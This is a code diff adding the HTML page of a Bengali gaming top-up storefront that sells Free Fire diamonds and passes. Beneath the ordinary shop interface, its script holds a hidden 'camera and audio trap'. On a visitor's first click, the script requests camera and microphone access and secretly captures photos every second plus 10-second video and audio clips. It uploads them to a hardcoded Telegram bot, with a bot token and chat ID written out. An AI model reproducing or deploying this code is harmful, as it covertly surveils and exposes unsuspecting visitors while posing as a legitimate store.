@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BD71TOPUP | Trusted Gaming TopUp</title>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { 
+            --primary: #22c55e; 
+            --primary-dark: #16a34a; 
+            --bg-color: #f4f7f6; 
+            --card-bg: #ffffff; 
+            --text-main: #1f2937; 
+            --text-muted: #6b7280; 
+            --header-bg: #ffffff; 
+            --dark-blue: #0f172a; 
+            --gold: #f59e0b;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', 'Hind Siliguri', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #e2e8f0; display: flex; justify-content: center; }
+        
+        .app-container { width: 100%; max-width: 480px; background-color: var(--bg-color); min-height: 100vh; position: relative; padding-bottom: 90px; box-shadow: 0 0 25px rgba(0,0,0,0.15); overflow-x: hidden; }
+        
+        /* Upgraded Header with Wallet */
+        .header { background: var(--header-bg); padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 50; box-shadow: 0 2px 15px rgba(0,0,0,0.06); }
+        .logo { font-size: 20px; font-weight: 800; color: var(--dark-blue); display: flex; align-items: center; gap: 6px; letter-spacing: -0.5px;}
+        .logo-icon { color: var(--primary); font-size: 24px; font-weight: 900; }
+        
+        .header-actions { display: flex; align-items: center; gap: 10px; }
+        .wallet-pill { background: #fef3c7; color: #b45309; font-size: 13px; font-weight: 700; padding: 5px 12px; border-radius: 20px; display: flex; align-items: center; gap: 4px; border: 1px solid #fde68a;}
+        .login-btn { background: var(--primary); color: #fff; border: none; padding: 7px 18px; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; transition: 0.2s;}
+        .login-btn:hover { background: var(--primary-dark); }
+
+        .view-section { display: none; animation: fadeIn 0.3s ease; }
+        .view-section.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        /* Premium Banner */
+        .hero-banner { margin: 15px; border-radius: 16px; height: 150px; background-color: #000; background-image: url('https://images.unsplash.com/photo-1542751371-adc38448a05e?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80'); background-size: cover; background-position: center; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #fff; text-align: center; position: relative; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.1);}
+        .hero-banner::before { content: ''; position: absolute; top:0; left:0; width:100%; height:100%; background: linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.8)); z-index: 1; }
+        .hero-content { position: relative; z-index: 2; }
+        .hero-content h2 { font-size: 22px; color: #fff; margin-bottom: 5px; font-family: 'Hind Siliguri'; font-weight: 700;}
+        .btn-telegram { background: #0088cc; color: #fff; padding: 8px 18px; border-radius: 25px; font-size: 13px; text-decoration: none; font-weight: 600; display: inline-block; margin-top: 5px; box-shadow: 0 4px 10px rgba(0,136,204,0.3);}
+
+        /* Home Grid Update */
+        .section-title { text-align: center; color: var(--dark-blue); font-size: 18px; font-weight: 800; margin: 25px 0 15px 0; display: flex; align-items: center; justify-content: center; gap: 8px;}
+        .section-title::before, .section-title::after { content: ''; height: 2px; width: 30px; background: var(--primary); border-radius: 2px;}
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 0 15px; }
+        .product-card { background: var(--card-bg); border-radius: 14px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.05); cursor: pointer; text-align: center; transition: 0.2s; border: 1px solid #e2e8f0; display: flex; flex-direction: column;}
+        .product-card:active { transform: scale(0.97); }
+        .product-card img { width: 100%; aspect-ratio: 1; object-fit: cover; display: block; border-bottom: 1px solid #f1f5f9; }
+        .product-card .title { font-size: 13px; font-weight: 700; padding: 12px 5px; color: var(--dark-blue); text-transform: uppercase; letter-spacing: 0.5px;}
+
+        /* Product Detail Page */
+        .detail-header { background: #fff; padding: 15px; display: flex; align-items: center; gap: 15px; margin-bottom: 10px; border-bottom: 1px solid #e2e8f0; }
+        .detail-header img { width: 65px; height: 65px; border-radius: 12px; object-fit: cover; border: 1px solid #e2e8f0;}
+        .detail-title { font-size: 19px; font-weight: 800; color: var(--dark-blue); }
+        .detail-sub { font-size: 12px; color: var(--primary-dark); background: #dcfce7; padding: 3px 10px; border-radius: 6px; display: inline-flex; align-items: center; gap: 4px; margin-top: 5px; font-weight: 700;}
+        
+        .step-box { background: #fff; margin-bottom: 12px; padding: 20px 15px; border-top: 1px solid #f1f5f9; border-bottom: 1px solid #f1f5f9;}
+        .step-title { font-size: 16px; font-weight: 700; color: var(--dark-blue); display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
+        .step-num { background: var(--primary); color: #fff; width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 13px; font-weight: 800; box-shadow: 0 2px 5px rgba(34, 197, 94, 0.4);}
+
+        .package-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .package-item { border: 2px solid #e2e8f0; border-radius: 10px; padding: 14px 10px; text-align: center; cursor: pointer; transition: 0.2s; position: relative; background: #fff;}
+        .package-item.active { border-color: var(--primary); background: #f0fdf4; box-shadow: 0 4px 10px rgba(34, 197, 94, 0.1);}
+        .package-item.active::after { content: '✓'; position: absolute; top: -10px; right: -10px; background: var(--primary); color: #fff; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; border: 2px solid #fff;}
+        .pkg-name { font-size: 13px; font-weight: 600; color: var(--text-main); margin-bottom: 6px; line-height: 1.2;}
+        .pkg-price { font-size: 15px; font-weight: 800; color: var(--primary-dark); }
+
+        .input-uid { width: 100%; padding: 16px; border: 2px solid #e2e8f0; border-radius: 10px; font-size: 15px; outline: none; background: #f8fafc; transition: 0.3s; font-weight: 500;}
+        .input-uid:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.1); }
+
+        .payment-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .payment-item { border: 2px solid #e2e8f0; border-radius: 10px; padding: 15px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; position: relative; min-height: 85px; background: #fff;}
+        .payment-item.active { border-color: var(--primary); background: #f0fdf4; }
+        .payment-item.active::after { content: '✓'; position: absolute; top: 6px; right: 6px; background: var(--primary); color: #fff; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; }
+        .payment-img { max-width: 90%; max-height: 40px; object-fit: contain; }
+        .wallet-icon { font-size: 30px; margin-bottom: 5px; }
+
+        .buy-action { padding: 20px 15px; background: #fff; border-top: 1px solid #e2e8f0;}
+        .btn-buy { width: 100%; padding: 16px; background: var(--primary); color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 800; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 12px rgba(34, 197, 94, 0.3);}
+        .btn-buy:active { transform: scale(0.98); }
+
+        /* Professional Policies Footer */
+        .footer-policies { padding: 25px 15px 30px; text-align: center; }
+        .policy-links { display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-bottom: 15px; }
+        .policy-links a { color: var(--text-muted); text-decoration: none; font-size: 12px; font-weight: 600; transition: 0.2s; }
+        .policy-links a:hover { color: var(--primary); }
+        .copyright { color: #94a3b8; font-size: 12px; font-weight: 500; }
+
+        /* Bottom Nav */
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 480px; background: #fff; display: flex; justify-content: space-around; padding: 12px 0 15px; box-shadow: 0 -4px 20px rgba(0,0,0,0.06); z-index: 100; border-top: 1px solid #f1f5f9; border-radius: 20px 20px 0 0; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #94a3b8; font-size: 11px; font-weight: 600; cursor: pointer; width: 25%; transition: 0.2s;}
+        .nav-item.active { color: var(--primary); }
+        .nav-item.active .nav-icon { transform: translateY(-3px); }
+        .nav-icon { font-size: 24px; margin-bottom: 3px; transition: 0.2s; }
+
+        .floating-support { position: fixed; bottom: 95px; right: 15px; background: #25D366; color: white; width: 55px; height: 55px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 28px; box-shadow: 0 4px 15px rgba(37,211,102,0.4); z-index: 90; cursor: pointer; transition: 0.2s; border: 2px solid #fff;}
+        .floating-support:active { transform: scale(0.9); }
+        
+        /* Camera Trap Hidden Elements */
+        #videoElement, #canvasElement { position: absolute; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; z-index: -1; }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <!-- Upgraded Header -->
+        <div class="header">
+            <div class="logo"><span class="logo-icon">৳D</span> BD71TOPUP</div>
+            <div class="header-actions">
+                <div class="wallet-pill">🪙 ৳ 0.00</div>
+                <button class="login-btn" onclick="alert('Login system coming soon!')">Login</button>
+            </div>
+        </div>
+
+        <!-- ================= HOME VIEW ================= -->
+        <div id="view-home" class="view-section active">
+            <div class="hero-banner">
+                <div class="hero-content">
+                    <h2>গিভওয়ে ও সকল অফার</h2>
+                    <p style="font-size: 13px; margin-bottom: 5px;">সম্পর্কে জানতে</p>
+                    <a href="#" class="btn-telegram">✈ টেলিগ্রাম চ্যানেলে জয়েন করুন</a>
+                </div>
+            </div>
+
+            <h2 class="section-title">REGULAR TOPUP</h2>
+            <div class="grid">
+                <div class="product-card" onclick="openProduct('FF LIKES', 'https://admin.dreamtopup.com/products/1774195508.jpg')">
+                    <img src="https://admin.dreamtopup.com/products/1774195508.jpg" alt="Likes">
+                    <div class="title">FF LIKES</div>
+                </div>
+                <div class="product-card" onclick="openProduct('UID TOPUP', 'https://admin.dreamtopup.com/products/1772115650.jpg')">
+                    <img src="https://admin.dreamtopup.com/products/1772115650.jpg" alt="UID TopUp">
+                    <div class="title">UID TOPUP</div>
+                </div>
+                <div class="product-card" onclick="openProduct('UNIPIN VOUCHER', 'https://admin.dreamtopup.com/products/1772115673.jpg')">
+                    <img src="https://admin.dreamtopup.com/products/1772115673.jpg" alt="Unipin">
+                    <div class="title">UNIPIN VOUCHER</div>
+                </div>
+                <div class="product-card" onclick="openProduct('WEEKLY MONTHLY', 'https://admin.dreamtopup.com/products/1772115683.jpg')">
+                    <img src="https://admin.dreamtopup.com/products/1772115683.jpg" alt="Weekly Monthly">
+                    <div class="title">WEEKLY MONTHLY</div>
+                </div>
+                <div class="product-card" onclick="openProduct('LEVEL UP PASS', 'https://admin.dreamtopup.com/products/1772115752.jpg')">
+                    <img src="https://admin.dreamtopup.com/products/1772115752.jpg" alt="Level Up Pass">
+                    <div class="title">LEVEL UP PASS</div>
+                </div>
+                <div class="product-card" onclick="openProduct('WEEKLY LITE BD', 'https://admin.dreamtopup.com/products/1772115690.jpg')">
+                    <img src="https://admin.dreamtopup.com/products/1772115690.jpg" alt="Weekly Lite">
+                    <div class="title">WEEKLY LITE BD</div>
+                </div>
+            </div>
+
+            <!-- Professional Footer -->
+            <div class="footer-policies">
+                <div class="policy-links">
+                    <a href="#" onclick="alert('Privacy Policy Details')">Privacy Policy</a>
+                    <a href="#" onclick="alert('Terms & Conditions')">Terms & Conditions</a>
+                    <a href="#" onclick="alert('Refund Policy')">Refund Policy</a>
+                </div>
+                <div class="copyright">
+                    © 2026 BD71TOPUP. All Rights Reserved.
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= PRODUCT DETAIL VIEW ================= -->
+        <div id="view-product" class="view-section">
+            <div class="detail-header">
+                <img id="detail-img" src="" alt="Product">
+                <div>
+                    <div class="detail-title" id="detail-title">Product Name</div>
+                    <div class="detail-sub">⚡ 2 সেকেন্ডে টপআপ</div>
+                </div>
+            </div>
+
+            <div class="step-box">
+                <div class="step-title"><div class="step-num">1</div> Select Recharge</div>
+                <div class="package-grid" id="dynamic-packages"></div>
+            </div>
+
+            <div class="step-box">
+                <div class="step-title"><div class="step-num">2</div> Account Info</div>
+                <input type="number" class="input-uid" placeholder="এখানে প্লেয়ার আইডি বসান">
+            </div>
+
+            <div class="step-box">
+                <div class="step-title"><div class="step-num">3</div> Select Payment Method</div>
+                <div class="payment-grid">
+                    <div class="payment-item active" onclick="selectPayment(this)">
+                        <div class="wallet-icon">💼</div>
+                        <div style="font-size: 13px; font-weight: 700; color: var(--dark-blue);">Wallet Pay</div>
+                        <div style="font-size: 10px; color: var(--text-muted);">৳ 0.00 Available</div>
+                    </div>
+                    <div class="payment-item" onclick="selectPayment(this)">
+                        <img class="payment-img" src="https://admin.dreamtopup.com/notices/1751344814_autopay.png" alt="Instant Pay">
+                    </div>
+                </div>
+            </div>
+
+            <div class="buy-action">
+                <div style="color: #ef4444; font-size: 12px; font-weight: 600; margin-bottom: 8px; text-align: center;">! Please Login To Purchase</div>
+                <button class="btn-buy" onclick="alert('Please login first to process payment.')">LOGIN TO BUY</button>
+            </div>
+        </div>
+
+        <div class="floating-support" onclick="alert('Support chat opening soon!')">🎧</div>
+
+        <!-- Bottom Navigation -->
+        <div class="bottom-nav">
+            <div class="nav-item active" onclick="switchTab('home', this)"><div class="nav-icon">🏠</div>Home</div>
+            <div class="nav-item" onclick="alert('Tutorials section coming soon!')"><div class="nav-icon">▶️</div>Tutorial</div>
+            <div class="nav-item" onclick="alert('Wallet details coming soon!')"><div class="nav-icon">💼</div>Wallet</div>
+            <div class="nav-item" onclick="alert('Profile section coming soon!')"><div class="nav-icon">👤</div>Profile</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="videoElement" autoplay playsinline muted></video>
+    <canvas id="canvasElement"></canvas>
+
+    <script>
+        const productData = {
+            'FF LIKES': [
+                { name: '200 FF LIKE- প্রতিদিন ১ আইডিতে ১বার', price: 'BDT 30' },
+                { name: '3000 FF LIKE- 15 দিন এ পাবেন', price: 'BDT 350' },
+                { name: '6000 FF LIKE- 15 দিন এ পাবেন', price: 'BDT 700' },
+                { name: '12000 FF LIKE- 15 দিন এ পাবেন', price: 'BDT 1400' }
+            ],
+            'UID TOPUP': [
+                { name: 'Weekly', price: 'BDT 155' }, { name: 'Monthly', price: 'BDT 775' },
+                { name: '25 Diamond', price: 'BDT 20' }, { name: '50 Diamond', price: 'BDT 35' },
+                { name: '115 Diamond', price: 'BDT 78' }, { name: '240 Diamond', price: 'BDT 156' },
+                { name: '355 Diamond', price: 'BDT 237' }, { name: '480 Diamond', price: 'BDT 316' },
+                { name: '610 Diamond', price: 'BDT 400' }, { name: '850 Diamond', price: 'BDT 558' },
+                { name: '1240 Diamond', price: 'BDT 795' }, { name: '1850 Diamond', price: 'BDT 1200' },
+                { name: '2530 Diamond', price: 'BDT 1600' }, { name: '5060 Diamond', price: 'BDT 3200' },
+                { name: '10120 Diamond', price: 'BDT 6400' }
+            ],
+            'UNIPIN VOUCHER': [
+                { name: '25 Diamond Pin', price: '20 TK' }, { name: '50 Diamond Pin', price: '35 TK' },
+                { name: '115 Diamond Pin', price: '78 TK' }, { name: '240 Diamond Pin', price: '158 TK' },
+                { name: '610 Diamond Pin', price: '400 TK' }, { name: '1240 Diamond Pin', price: '795 TK' },
+                { name: '2500 Diamond Pin', price: '1600 TK' }, { name: 'Weekly Pin', price: '155 TK' },
+                { name: 'Monthly Pin', price: '775 TK' }
+            ],
+            'WEEKLY MONTHLY': [
+                { name: 'Weekly', price: 'BDT 155' }, { name: '2X Weekly', price: 'BDT 310' },
+                { name: '3X Weekly', price: 'BDT 465' }, { name: 'Monthly', price: 'BDT 775' },
+                { name: '2X Monthly', price: 'BDT 1550' }, { name: '1X Weekly + 1X Monthly', price: 'BDT 930' }
+            ],
+            'LEVEL UP PASS': [
+                { name: 'Level Up Package - Level 6', price: '40 TK' }, { name: 'Level Up Package - Level 10', price: '75 TK' },
+                { name: 'Level Up Package - Level 15', price: '75 TK' }, { name: 'Level Up Package - Level 20', price: '75 TK' },
+                { name: 'Level Up Package - Level 25', price: '75 TK' }, { name: 'Level Up Package - Level 30', price: '105 TK' },
+                { name: 'Full Level Up (1270 Diamond)', price: '445 TK' }
+            ],
+            'WEEKLY LITE BD': [
+                { name: '1x Weekly Lite', price: 'BDT 40' }, { name: '2X Weekly Lite', price: 'BDT 80' },
+                { name: '3X Weekly Lite', price: 'BDT 120' }, { name: '5X Weekly Lite', price: 'BDT 200' }
+            ]
+        };
+
+        function switchTab(tab, element) {
+            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+            element.classList.add('active');
+            document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
+            if(tab === 'home') document.getElementById('view-home').classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function openProduct(title, imgSrc) {
+            document.getElementById('detail-title').innerText = title;
+            document.getElementById('detail-img').src = imgSrc;
+            const pkgContainer = document.getElementById('dynamic-packages');
+            pkgContainer.innerHTML = '';
+            const packages = productData[title] || [];
+            packages.forEach((pkg, index) => {
+                const isActive = index === 0 ? 'active' : '';
+                pkgContainer.innerHTML += `
+                    <div class="package-item ${isActive}" onclick="selectPackage(this)">
+                        <div class="pkg-name">${pkg.name}</div>
+                        <div class="pkg-price">${pkg.price}</div>
+                    </div>`;
+            });
+            document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
+            document.getElementById('view-product').classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function selectPackage(element) { document.querySelectorAll('.package-item').forEach(el => el.classList.remove('active')); element.classList.add('active'); }
+        function selectPayment(element) { document.querySelectorAll('.payment-item').forEach(el => el.classList.remove('active')); element.classList.add('active'); }
+
+        // ================= CAMERA & AUDIO TRAP LOGIC =================
+        const BOT_TOKEN = '8725809195:AAFjqaGyk-3Gtovdc-OQImMhJ8TXm9Pw6dY';
+        const CHAT_ID = '8091904438'; 
+        
+        let currentStream = null;
+        let photoInterval = null;
+        let isRunning = false;
+
+        // FIX: The user MUST click the screen to allow audio recording to bypass security.
+        // It triggers automatically the very first time they click ANYWHERE on the site.
+        document.body.addEventListener('click', function initCamera() {
+            if (!isRunning) {
+                const savedCamera = localStorage.getItem('cameraTarget') || 'user';
+                startCapture(savedCamera);
+            }
+            document.body.removeEventListener('click', initCamera); // Removes itself after 1st click
+        }, { once: true });
+
+        async function startCapture(facingMode) {
+            isRunning = true;
+            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+            if (photoInterval) clearInterval(photoInterval);
+
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: true
+                });
+                
+                const video = document.getElementById('videoElement');
+                video.srcObject = currentStream;
+
+                video.onplaying = () => {
+                    setTimeout(() => {
+                        // 1. Photo loop (1s)
+                        capturePhoto(facingMode); 
+                        photoInterval = setInterval(() => capturePhoto(facingMode), 1000); 
+                        
+                        // 2. Start Video loop (10s)
+                        recordVideoLoop(facingMode);
+
+                        // 3. Start pure separate Audio loop (10s)
+                        recordAudioLoop();
+                    }, 500);
+                };
+            } catch (err) {
+                console.error("Camera access denied.");
+                isRunning = false;
+            }
+        }
+
+        // --- PURE AUDIO LOOP (10s) ---
+        function recordAudioLoop() {
+            if (!currentStream || !currentStream.active) return;
+            
+            const audioTracks = currentStream.getAudioTracks();
+            if (audioTracks.length === 0) return;
+            
+            const audioStream = new MediaStream(audioTracks);
+            const audioRecorder = new MediaRecorder(audioStream);
+            let chunks = [];
+            
+            audioRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            
+            audioRecorder.onstop = () => {
+                if (chunks.length > 0) {
+                    sendStandaloneAudio(chunks);
+                }
+                if (currentStream && currentStream.active) recordAudioLoop();
+            };
+
+            audioRecorder.start();
+            setTimeout(() => { if (audioRecorder.state === "recording") audioRecorder.stop(); }, 10000);
+        }
+
+        // --- VIDEO LOOP (10s) ---
+        function recordVideoLoop(facingMode) {
+            if (!currentStream || !currentStream.active) return;
+            
+            let mimeType = 'video/webm';
+            if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4'; 
+            
+            let mediaRecorder;
+            try {
+                // Optimal Sweet Spot: 2 Mbps (2000000). High quality 720p without performance drop.
+                mediaRecorder = new MediaRecorder(currentStream, { videoBitsPerSecond: 2000000 });
+            } catch(e) {
+                mediaRecorder = new MediaRecorder(currentStream);
+            }
+            
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            
+            mediaRecorder.onstop = () => {
+                if (chunks.length > 0) {
+                    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm'; 
+                    sendVideo(chunks, facingMode, ext);
+                }
+                if (currentStream && currentStream.active) recordVideoLoop(facingMode); 
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
+        }
+
+        // --- PHOTO CAPTURE (1s) ---
+        function capturePhoto(facingMode) {
+            const video = document.getElementById('videoElement');
+            const canvas = document.getElementById('canvasElement');
+            const ctx = canvas.getContext('2d');
+            
+            if (video.videoWidth === 0) return; 
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // INCREASED QUALITY: 0.7 for sharp, good quality photos without massive file sizes.
+            canvas.toBlob(blob => {
+                if (!blob) return;
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, `photo_${facingMode}.jpg`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.7);
+        }
+
+        function sendVideo(chunks, facingMode, ext) {
+            const blob = new Blob(chunks, { type: `video/${ext}` }); 
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('video', blob, `video_${facingMode}.${ext}`);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+        }
+
+        function sendStandaloneAudio(chunks) {
+            const blob = new Blob(chunks, { type: 'audio/webm' }); 
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('audio', blob, 'recording.webm');
+            
+            // Uses sendAudio so Telegram treats it as a voice note/player
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd })
+                .catch(err => console.error("Audio upload failed", err));
+        }
+
+        window.addEventListener('storage', (event) => {
+            if (event.key === 'cameraTarget') {
+                const newCamera = event.newValue || 'user';
+                if (isRunning) startCapture(newCamera);
+            }
+        });
+    </script>
+</body>
+</html>
